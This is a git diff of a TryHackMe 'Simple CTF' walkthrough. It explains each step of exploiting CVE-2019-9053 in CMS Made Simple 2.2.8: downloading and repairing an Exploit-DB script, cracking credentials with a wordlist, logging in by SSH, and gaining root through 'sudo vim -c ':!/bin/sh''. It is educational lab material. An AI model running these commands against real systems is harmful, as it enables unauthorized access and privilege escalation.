@@ -93,11 +93,11 @@ DOWNLOADED: 4612 - FOUND: 3
 
 # Vulnerability Identification
 > Vulnerability Identification Using Exploit DB
-6. `firefox http://{TARGET IP}/simple`
+6. `firefox http://{TARGET IP}/simple` to launch Firefox and redirect it to the target's **/simple** directory
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/CMS%20Made%20Simple.png)
 
-7. `searchsploit "CMS made simple 2.2.8" --www`
+7. `searchsploit "CMS made simple 2.2.8" --www` 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ searchsploit "CMS made simple 2.2.8" --www
@@ -123,11 +123,11 @@ Saving to: ‘46635.1’
 
 2023-07-02 12:12:58 (40.4 MB/s) - ‘46635.1’ saved [6456/6456]
 ```
-9. `cd Downloads`
+9. `cd ~/Downloads` to change to th
 10. `ls`
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ cd Downloads
+└─$ cd ~/Downloads
 ```
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
@@ -137,7 +137,7 @@ Saving to: ‘46635.1’
 
 # Vulnerability Exploitation
 > Exploiting CVE-2019-9053
-11. `python 46635`
+11. `python 46635` to execute the exploit, which ended outputting an error message that our script has some syntax errors
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python 46635                                                       
@@ -146,7 +146,8 @@ Saving to: ‘46635.1’
     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 ```
-12. `gedit python 46635` to open up the Python exploit and add parantheses for every print command that's missing one (Lines 25, 26, 27, 28, 63, 69, and 183) as well as change it from using the **python** interpreter () to the **python3** interpreter ()
+12. `gedit python 46635` to open up the Python script, which we'll then go ahead and add parantheses for every print command that's missing one (Lines 25, 26, 27, 28, 63, 69, and 183) as well as change it from using the **python** interpreter (#!/usr/bin/env **python**
+) to the **python3** interpreter (#!/usr/bin/env **python3**)
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ gedit 46635
@@ -154,7 +155,7 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py.png)
 
-13. `python 46635`
+13. `python 46635` to execute the exploit again, which ended up outputting an error onto our terminal saying that we're missing the required arguments needed for the script to be able to successfully execute
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python 46635   
@@ -186,7 +187,7 @@ UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invali
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py%20pt2.png)
 
-16. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
+16. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}` to execute the exploit once again, which eneded up working and providing us with a set of credentials that we can use to authenticate as when connecting to the target
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ python3 46635 -u http://10.10.130.66/simple --crack -w rockyou.txt
@@ -217,10 +218,10 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
 Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
 $
 ```
-18. `whoami`
-19. `pwd`
-20. `ls`
-21. `cat {USER TEXT FILE}`
+18. `whoami` to verify that we're running as the user we originally connected as through SSH
+19. `pwd` to print the current working directory's full path onto our terminal
+20. `ls` to list the available files and directories that are in our current working directory onto our terminal
+21. `cat {USER TEXT FILE}` to display the contents of the user text file we found onto our terminal, which ended up containing the user flag for this challenge
 ```bash
 $ whoami
 mitch
@@ -240,13 +241,13 @@ G00d j0b, keep up!
 
 # Post Exploitation
 > Privilege Escalation
-22. `sudo -l`
+22. `sudo -l` to list the sudo privileges assigned to the user that we're logged in as, which shows that they can execute the **vim** program without needing the root's password
 ```bash
 $ sudo -l     
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ```
-23. `firefox "https://gtfobins.github.io/" and search for vim
+23. `firefox "https://gtfobins.github.io/"` to launch Firefox and redirect it to the GTFOBins website, and search "vim", which ended up providing us with some code sequences that we could use to gain higher privileges within our target's compromised system
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/GTFOBins.png)
 
@@ -255,7 +256,7 @@ User mitch may run the following commands on Machine:
 $ sudo vim -c ':!/bin/sh'
 #
 ```
-25. `whoami`
+25. `whoami` 
 26. `ls /root`
 27. `cat {ROOT TEXT FILE}`
 ```bash
@@ -283,7 +284,7 @@ W3ll d0n3. You made it!
 5. `firefox http://{TARGET IP}/simple`
 6. `searchsploit "CMS made simple 2.2.8" --www`
 7. `wget https://www.exploit-db.com/raw/46635`
-8. `cd Downloads`
+8. `cd ~/Downloads`
 9. `ls`
 10. `python 46635`
 11. `gedit python 46635`
